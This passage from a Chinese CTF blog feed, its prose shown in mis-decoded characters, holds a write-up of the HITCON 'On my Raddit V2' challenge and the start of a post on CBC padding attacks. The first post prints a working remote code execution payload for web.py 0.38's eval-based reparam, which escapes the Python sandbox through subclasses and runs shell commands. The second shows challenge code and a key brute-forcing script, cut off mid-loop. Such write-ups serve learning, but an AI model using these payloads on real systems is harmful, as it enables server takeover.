çš„æœ¬æ„æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªç­‰æ•ˆå¯†é’¥ï¼Œç„¶åå°±å»è¯»åˆ°æºç ï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ°å¯†é’¥äº†ã€‚è¿™å¥æç¤ºï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-40bf9081e40a16f1.png" alt="image.png"></p><p>å½“æ—¶æ²¡æœ‰æ³¨æ„åˆ°â€¦å°±å»ç©·ä¸¾è¯•äº† (ä¸æ•¢å†™æäº¤ flag çš„è„šæœ¬æ€•è¢« ban)</p><h4 id="On-my-Raddit-V2-å¤ç°"><a href="#On-my-Raddit-V2-å¤ç°" class="headerlink" title="On my Raddit V2(å¤ç°)"></a>On my Raddit V2(å¤ç°)</h4><p>web.py å®¡ä¸åŠ¨â€¦ è·Ÿç€å¸ˆå‚…ä»¬å¤ç°äº†ä¸€æ³¢ã€‚</p><p>èµ›åè·Ÿ Nu1l å’Œ TD çš„å¸ˆå‚…è¯·æ•™äº†ä¸€æ³¢ï¼Œå¸ˆå‚…ç”©å‡ºçš„é“¾æ¥:<code>https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/</code>ï¼Œçœ‹äº†åŠå¤©ä¹Ÿä¸çŸ¥é“å’Œæ­¤é¢˜è”ç³»åœ¨å“ªã€‚</p><p>æ‰å¾—çŸ¥è¿™é¢˜è¦è¿½ web.py çš„æºç ã€‚</p><p>é™¤äº†ä¸Šé¢ä¸‹çš„ app.pyï¼Œè¿˜è¦ä¸‹ä¸€ä¸ª <code>requirements.txt</code> æ–‡æ¡£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt(&quot;m&#x3D;d&amp;f&#x3D;requirements.txt&quot;) -&gt; fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232</span><br><span class="line">payload: ?s&#x3D;fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232</span><br></pre></td></tr></table></figure><p>å‘ç° web.py ç‰ˆæœ¬æ˜¯ 0.38ï¼Œæ‰€ä»¥è¿™ä¸ª<a href="https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/">é“¾æ¥</a>çš„æ´è¿˜æ²¡æœ‰ä¿®å½»åº•ã€‚</p><p>å¼€å§‹çœ‹é“¾æ¥ä¸é¢˜è”ç³»ä¸åˆ°ä¸€èµ·ï¼Œä¹‹åæ‰çŸ¥é“è¦è¿½ web.py æºç ã€‚åœ¨ app.py ä¸­è¿™å¥ä»£ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc8bd32b2ce0df58.png" alt="image.png"></p><p>å»è¿½è¿™ä¸ª limitï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-29e105e5b8dda3e7.png" alt="image.png"></p><p>å‘ç°ä»£å…¥äº†æŸ¥è¯¢é‡Œï¼Œé™åˆ¶æŸ¥è¯¢å‡ºçš„ç»“æœæ•°ã€‚</p><p>è¿½ web.py çš„æºç ï¼Œä¹Ÿå°±æ˜¯ <code>db.select</code> å‡½æ•°ï¼Œå°±èƒ½è¿½åˆ°é“¾æ¥çš„åœ°æ–¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reparam</span>(<span class="params">string_, dictionary</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Takes a string and a dictionary and interpolates the string</span></span><br><span class="line"><span class="string">    using values from the dictionary. Returns an `SQLQuery` for the result.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam(&quot;s = $s&quot;, dict(s=True))</span></span><br><span class="line"><span class="string">        &lt;sql: &quot;s = &#x27;t&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam(&quot;s IN $s&quot;, dict(s=[1, 2]))</span></span><br><span class="line"><span class="string">        &lt;sql: &#x27;s IN (1, 2)&#x27;&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dictionary = dictionary.copy() <span class="comment"># eval mucks with it</span></span><br><span class="line">    vals = []</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">        <span class="keyword">if</span> live:</span><br><span class="line">            v = <span class="built_in">eval</span>(chunk, dictionary)</span><br><span class="line">            result.append(sqlquote(v))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(chunk)</span><br><span class="line">    <span class="keyword">return</span> SQLQuery.join(result, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ–‡ä¸­è¯´äº† <code>The entry points to reparam() are functions _where(), query(), and gen_clause()</code>query() å¯¹åº”çš„å°±æ˜¯æ­¤é¢˜çš„ <code>db.select</code>ï¼Œè¿™é‡Œçœ‹åˆ°äº†éå¸¸æ˜¾çœ¼çš„ evalã€‚</p><p>æ ¹æ®é“¾æ¥ä¸­çš„æ–¹æ³•æ„é€  payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import urlparse</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">ENCRPYTION_KEY &#x3D; &#39;megnnaro&#39;</span><br><span class="line"></span><br><span class="line">def encrypt(s):</span><br><span class="line">    length &#x3D; DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s &#x3D; s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher &#x3D; DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    return cipher.encrypt(s).encode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">def decrypt(s):</span><br><span class="line">    try:</span><br><span class="line">        data &#x3D; s.decode(&#39;hex&#39;)</span><br><span class="line">        cipher &#x3D; DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data &#x3D; cipher.decrypt(data)</span><br><span class="line">        data &#x3D; data[:-ord(data[-1])]</span><br><span class="line">        return dict(urlparse.parse_qsl(data))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e.message</span><br><span class="line">        return &#123;&#125;</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&#39;m&#39;: &#39;p&#39;, &#39;l&#39;: &quot;$&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls &#x2F; &gt; &#x2F;tmp&#x2F;gml.txt&#39;))()&#125;&quot;&#125;))</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&#39;m&#39;:&#39;d&#39;,&#39;f&#39;:&#39;&#x2F;tmp&#x2F;gml.txt&#39;&#125;))</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æ ¹ç›®å½•æœ‰å•¥ä¸œè¥¿ï¼Œè¿™é‡Œæ²¡æœ‰å›æ˜¾æ‰€ä»¥æˆ‘ä»¬æŠŠæ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶å†å»ä¸‹è½½ï¼š<br>æ‰§è¡Œç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b5bee3bac58d5ae4add21bdbd2653d63691ca068a2bd875b32f132007c8a1d5e7c12cd963db7c487ddafb51c16b96b4757</span><br><span class="line">4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªè®¿é—®ï¼Œä¸‹è½½åˆ° ls çš„å‘½ä»¤ç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0cd6d84bd948876c.png" alt="image.png"></p><p>çœ‹åˆ°äº† <code>read_flag</code>ï¼Œæ‰§è¡Œè¿™ä¸ªåº”è¯¥å°±å¯ä»¥å¾—åˆ° flagï¼Œä¿®æ”¹payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print encrypt(urllib.urlencode(&#123;&#39;m&#39;: &#39;p&#39;, &#39;l&#39;: &quot;$&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;&#x2F;read_flag &gt; &#x2F;tmp&#x2F;gml.txt&#39;))()&#125;&quot;&#125;))</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&#39;m&#39;:&#39;d&#39;,&#39;f&#39;:&#39;&#x2F;tmp&#x2F;gml.txt&#39;&#125;))</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b543324bca0702d4140e4bdc4c1ebe0ea54e28b1ed72c5f16ec1f8c82e7f139f375a806b6212666f872dfbb2d1031b37ca9e581b6f767797bd</span><br><span class="line">4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªè®¿é—®ï¼Œå¯ä»¥å¾—åˆ° flagï¼š</p><blockquote><p>hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}</p></blockquote><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://xz.aliyun.com/t/2953#toc-12">Nu1lçš„wp</a></p></li><li><p><a href="https://xz.aliyun.com/t/2961">https://xz.aliyun.com/t/2961</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CBC-Paddingæ”»å‡»</title>
      <link href="/2018/10/19/CBC-Padding%E6%94%BB%E5%87%BB/"/>
      <url>/2018/10/19/CBC-Padding%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>å¯¹äº CBC ç¿»è½¬å­—èŠ‚æ”»å‡»ä»¥åŠ Padding Oracle Attack è¿™å—çš„çŸ¥è¯†ä¸€ç›´ä¸æ€ä¹ˆä¼šè¿ç”¨ï¼Œæ‰€ä»¥ä»Šå¤©å¤ç°äº†ä¸€é“åœ¨Xman å¤ä»¤è¥æ‰“æ’ä½èµ›çš„ä¸€é“å¯†ç é¢˜ï¼Œç®—æ˜¯ Padding Oracle çš„ä¸€ä¸ªç®€åŒ–ç‰ˆï¼Œæ€æƒ³å¤§åŒå°å¼‚ï¼Œåªæ˜¯è¿™ä¸ªé¢˜æ²¡æœ‰å’ŒæœåŠ¡å™¨äº¤äº’ã€‚</p><p>è¿™ä¸ªé¢˜ä¹Ÿæ˜¯ä»¿ hack.lu 2016 çš„ä¸€é“é¢˜ï¼Œæ–‡ç« æœ«å°¾æœ‰é“¾æ¥åœ°å€ã€‚</p><p>çœ‹ä¸‹é¢˜ï¼Œç»™äº†<code>AESCipher.py</code>,<code>lockfile.py</code>å’Œ<code>flag.encrypted</code>ä¸‰ä¸ªæ–‡ä»¶ã€‚<br>ä»£ç ï¼š</p><a id="more"></a><p>AESCipher.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.bs = <span class="number">32</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">str_to_bytes</span>(<span class="params">data</span>):</span></span><br><span class="line">        u_type = <span class="built_in">type</span>(<span class="string">b&#x27;&#x27;</span>.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, u_type):</span><br><span class="line">            <span class="keyword">return</span> data.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_pad</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="keyword">return</span> s + (self.bs - <span class="built_in">len</span>(s) % self.bs</span><br><span class="line">                   ) * AESCipher.str_to_bytes(<span class="built_in">chr</span>(self.bs - <span class="built_in">len</span>(s) % self.bs))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_unpad</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">return</span> s[:-<span class="built_in">ord</span>(s[<span class="built_in">len</span>(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        raw = self._pad(AESCipher.str_to_bytes(raw))</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> iv + cipher.encrypt(raw)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, enc</span>):</span></span><br><span class="line">        iv = enc[:AES.block_size]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> cipher.decrypt(enc[AES.block_size:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>lockfile.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> AESCipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLocker</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, keys</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(keys) == <span class="number">4</span></span><br><span class="line">        self.keys = keys</span><br><span class="line">        self.ciphers = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            self.ciphers.append(AESCipher(keys[i]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self, plaintext</span>):</span></span><br><span class="line">        stage1 = self.ciphers[<span class="number">0</span>].encrypt(plaintext)</span><br><span class="line">        stage2 = self.ciphers[<span class="number">1</span>].encrypt(stage1)</span><br><span class="line">        stage3 = self.ciphers[<span class="number">2</span>].encrypt(stage2)</span><br><span class="line">        ciphertext = self.ciphers[<span class="number">3</span>].encrypt(stage3)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">self, ciphertext</span>):</span></span><br><span class="line">        stage3 = AESCipher._unpad(self.ciphers[<span class="number">3</span>].decrypt(ciphertext))</span><br><span class="line">        stage2 = AESCipher._unpad(self.ciphers[<span class="number">2</span>].decrypt(stage3))</span><br><span class="line">        stage1 = AESCipher._unpad(self.ciphers[<span class="number">1</span>].decrypt(stage2))</span><br><span class="line">        plaintext = AESCipher._unpad(self.ciphers[<span class="number">0</span>].decrypt(stage1))</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="comment"># PASSWORD SHOULD BE Visible character</span></span><br><span class="line">        print(<span class="string">&quot;Usage: ./lockfile.py plainfile password&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    plaintext = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    password = sys.argv[<span class="number">2</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(password) == <span class="number">8</span></span><br><span class="line">    i = <span class="built_in">len</span>(password) / <span class="number">4</span></span><br><span class="line">    keys = [</span><br><span class="line">        hashlib.sha256(password[<span class="number">0</span>:i]).digest(),</span><br><span class="line">        hashlib.sha256(password[i:<span class="number">2</span> * i]).digest(),</span><br><span class="line">        hashlib.sha256(password[<span class="number">2</span> * i:<span class="number">3</span> * i]).digest(),</span><br><span class="line">        hashlib.sha256(password[<span class="number">3</span> * i:<span class="number">4</span> * i]).digest(),</span><br><span class="line">    ]</span><br><span class="line">    s = FileLocker(keys)</span><br><span class="line"></span><br><span class="line">    ciphertext = s.enc(plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span>(filename + <span class="string">&quot;.encrypted&quot;</span>, <span class="string">&quot;w&quot;</span>).write(ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŠ å¯†ç¨‹åºå¯¹äº key çš„å¤„ç†å¾ˆç‰¹åˆ«ï¼Œå…«å­—ç¬¦çš„ key è¢«åˆ†æˆäº†å››ç»„ï¼Œæ¯ç»„ä¸¤ä¸ªå­—ç¬¦å“ˆå¸Œåä½œä¸º AES å¯†é’¥ï¼ŒæŠŠæ˜æ–‡åŠ å¯†äº†å››æ¬¡ã€‚é‡‡ç”¨çš„æ˜¯ä¸‹ä¸€è½®åŠ å¯†ä¸Šä¸€è½®çš„å¯†æ–‡è¿™ç§å½¢å¼ã€‚</p><p>æ³¨æ„åˆ°è¿™é‡Œçš„å¡«å……æ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pad</span>(<span class="params">self, s</span>):</span></span><br><span class="line">       <span class="keyword">return</span> s + (self.bs - <span class="built_in">len</span>(s) % self.bs</span><br><span class="line">                  ) * AESCipher.str_to_bytes(<span class="built_in">chr</span>(self.bs - <span class="built_in">len</span>(s) % self.bs))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡‡ç”¨çš„æ˜¯ç±»ä¼¼ PKCS5 çš„å¡«å……æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºæ˜æ–‡å¤šå°‘ä½éƒ½éœ€è¦å¡«å……ã€‚</p><p>ç›´æ¥çˆ†ç ´å…«ä¸ªå­—ç¬¦æ˜¾ç„¶ä¸å¯èƒ½ï¼Œæ•°é‡çº§æ˜¯<code>len(dict)^8</code>,æˆ‘ä»¬è€ƒè™‘æŠŠæ¯æ­¥åˆ†è§£ï¼Œå¦‚æœå››è½®åŠ å¯†ä¸­ï¼Œæ¯ä¸€è½®éƒ½èƒ½çŸ¥é“å½“å‰çš„ä¸¤ä¸ªå­—ç¬¦æ˜¯å¦æ­£ç¡®ï¼Œé‚£ä¹ˆæ•°é‡çº§å°±å˜æˆäº†<code>4*(len(dict)^2)</code>,è¿˜æ˜¯å¾ˆå®¹æ˜“çš„ã€‚</p><p>æ—¢ç„¶ä½¿ç”¨äº†è¿™ä¸ªå¡«å……è§„åˆ™ï¼Œæ¯ä¸€è½®å°±å¯ä»¥é€šè¿‡åˆ¤æ–­è§£å¯†åçš„æœ€åå¡«å……æ¥åˆ¤æ–­è§£å¯†å¯†é’¥æ˜¯å¦æ­£ç¡®ï¼Œè¿™æ˜¯åˆ¤æ–­å¡«å……æ­£ç¡®ä¸å¦çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPadding</span>(<span class="params">raw</span>):</span></span><br><span class="line">    s=raw[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">chr</span>(<span class="number">0</span>) <span class="keyword">or</span> s==<span class="built_in">chr</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> raw[<span class="built_in">len</span>(raw)-<span class="built_in">ord</span>(s):]==<span class="built_in">ord</span>(s)*s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯<code>chr(0)</code>è‚¯å®šä¸æ­£ç¡®ï¼Œæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯<code>chr(1)</code>å€’æ˜¯æœ‰å¯èƒ½æ­£ç¡®ï¼Œæ­£å¥½ç¼ºäº†ä¸€ä¸ªå­—èŠ‚ï¼Œä½†åªä¼šå‘ç”Ÿåœ¨å¡«å……æœ€åŸå§‹çš„æ˜æ–‡çš„æ—¶å€™ï¼Œå› ä¸ºç¬¬äºŒè½®å¼€å§‹åŠ å¯†çš„éƒ½æ˜¯ä¸Šä¸€è½®çš„å¯†æ–‡ï¼Œéƒ½æ˜¯ AES åˆ†ç»„å¤§å°çš„å€æ•°ï¼Œä¸å¯èƒ½å·®ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œä¸”çˆ†ç ´çš„è¿‡ç¨‹ä¸­å¦‚æœè§£å¯†å‡ºæ¥æœ€åä¸€ä¸ªå­—èŠ‚æ­£å¥½æ˜¯ chr(1),å°±ä¼šè®¤ä¸ºå¡«å……æ­£ç¡®ï¼Œåˆ¤æ–­é”™è¯¯çš„å‡ ç‡è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ‰€ä»¥ä»£ç é‡Œç›´æ¥è¿”å› False äº†ã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> AESCipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPadding</span>(<span class="params">raw</span>):</span></span><br><span class="line">    s=raw[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">chr</span>(<span class="number">0</span>) <span class="keyword">or</span> s==<span class="built_in">chr</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> raw[<span class="built_in">len</span>(raw)-<span class="built_in">ord</span>(s):]==<span class="built_in">ord</span>(s)*s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">flag_enc=<span class="built_in">open</span>(<span class="string">&quot;flag.encrypted&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> 